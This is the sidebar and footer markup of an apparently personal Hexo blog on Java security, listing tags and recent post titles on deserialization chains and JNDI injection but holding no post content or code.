      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" rel="tag">注入漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Java安全</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15px;">反序列化</a> <a href="/tags/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">注入漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="font-size: 20px;">漏洞分析</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/01/07/hello-world/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\hello-world</a>
          </li>
        
          <li>
            <a href="/2025/01/07/CC%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\CC链反序列化</a>
          </li>
        
          <li>
            <a href="/2025/01/07/CB%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\CB链反序列化</a>
          </li>
        
          <li>
            <a href="/2025/01/07/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Hessian反序列化</a>
          </li>
        
          <li>
            <a href="/2025/01/07/JNDI%E6%B3%A8%E5%85%A5/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\JNDI注入</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>